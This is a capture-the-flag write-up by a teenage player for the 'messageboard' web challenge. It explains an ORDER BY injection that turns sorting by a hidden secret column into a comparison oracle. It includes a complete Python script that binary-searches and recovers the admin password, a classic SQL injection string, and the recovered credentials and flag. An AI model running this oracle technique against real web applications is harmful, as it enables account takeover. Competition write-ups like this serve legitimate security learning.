---
title: Birthday writeup!!! messageboard
date: 2026/08/18
status: published
description: A write-up for gaslightctf26 messageboard
tags: ctf, birthday
---
:o its my birthday and im 16 
> spoilers obviously duh

### Details
- Author: sportshead/sportzpikachu
- Category: ~~OSINT~~ Web Exploitation
- Score Acquired: 347 (124 solves)
- Difficulty ★★★★☆☆☆☆☆☆  


### Description
![image](https://hackmd.io/_uploads/rk4qMhxDMx.png)


## Writeup

I first thought this was going to be some JWT or cookie forgery thing from the title, but it was not. [insert fah noise]

The actual bug was an SQL ordering oracle. More specifically, the app let us choose the column used in an `ORDER BY`, and one of the columns we could choose was the hidden `secret` column.

How did I find this? ~~osinting the challenge author~~
if we look at https://sportshead.dev/2023/11/15/hkcert23/#secret-notebook---web
![image](https://hackmd.io/_uploads/B1KH0sgDzg.png)
![image](https://hackmd.io/_uploads/r1LdCjePMx.png)
There was a nice little writeup already!!, how peculiar!
and it somehow kinda matches with messageboard?


### Code breakdown

The relevant part of the source had this:

```js
const column = url.searchParams.get("column") || "name";
const order = url.searchParams.get("order") || "ASC";

if (!filter(column) || !filter(order)) {
  return Response.json({ error: "nuh uh" }, { status: 400 });
}

const publicStories = await query(`
  SELECT name AS author,
         'public' AS visibility,
         public AS story,
         public_expiry AS expiry
  FROM users
  WHERE public IS NOT NULL
    AND public_expiry > now()
  ORDER BY ${column} ${order}`);
```

The filter only allowed alphanumeric characters. So classic SQL injection like this was not possible:

```text
' OR 1=1 --
```

But it still allowed valid SQL identifiers. `secret` was alphanumeric, and it was also a real column in the database.

The frontend did not display `secret`, but the database could still use it for sorting. This was the whole bug.

### ~~From the challenge author writeup~~ Turning the sort into an oracle

I could create users with passwords I chose. So I made a user with a 16-character hex password, then posted a public story from that account.

After that I requested:

```text
/api/stories?column=secret&order=ASC
```

The response showed the public stories in secret order. Since I knew my own secret, I could compare the position of my user and the admin user.

If the admin appeared before my user, then:

```text
admin_secret < my_guess
```

If the admin appeared after my user, then:

```text
admin_secret > my_guess
```

So even though I could not read the secret directly, I had a comparison oracle for it.

### Binary searching for the admin secret

The admin secret came from 8 random bytes, which becomes 16 hex characters. That is 64 bits of secret, so a binary search needs at most 64 comparisons.

Each comparison was basically:

1. create a user with the current guess as its password
2. post a public story
3. request the stories ordered by `secret`
4. check whether `admin` was before or after my user
5. update the binary-search range

This is pretty annoying by hand, but not that hard to automate, so time to write a script!

### Getting the flag

After recovering the admin secret, I logged in as:

```text
admin:cbd45670ae3ea76e
```

Then I read the admin's close-friends story, which contained the flag!!



### Flag
```text
gaslightCTF{ar3_y0u_my_cl0s3_fr13nd_n0w?_75aa7d355f15}
```


### Exact script used
```py
import requests,secrets
url="https://01d52094-a1ed-4f2a-af0f-40a4228c2bca.play.gaslightctf.cooking:1337"
n = 16**16
def check(p):
    s=requests.Session()
    u = "u"+secrets.token_hex(6)

    s.post(url+"/api/signup",json={"name":u,"password":p})
    s.post(url+"/api/stories",json={
        "story":"x", "visibility":"public", "minutes":1440
    })

    r=s.get(url+"/api/stories?column=secret&order=ASC").json()
    a=[x["author"] for x in r if x["visibility"]=="public"]

    return a.index(u) < a.index("admin")

lo,hi=0,n-1

while lo < hi:
    m=(lo+hi)//2
    p=f"{m:016x}"

    if check(p):
        lo=m+1
    else:
        hi=m

for x in [lo-1,lo,lo+1]:
    p=f"{x:016x}"
    s=requests.Session()
    r=s.post(url+"/api/login",json={"name":"admin","password":p})

    if r.ok:
        print("password:",p)
        stories=s.get(url+"/api/stories").json()
        for story in stories:
            if story["author"]=="admin" and story["visibility"]=="close_friends":
                print(story["story"])

```


### Conclusion
This was pretty funny as the challenge author had literally a writeup on a kinda similar challenge. Thanks for reading this writeup! I hope that ~~this can win me some $$$~~ !!!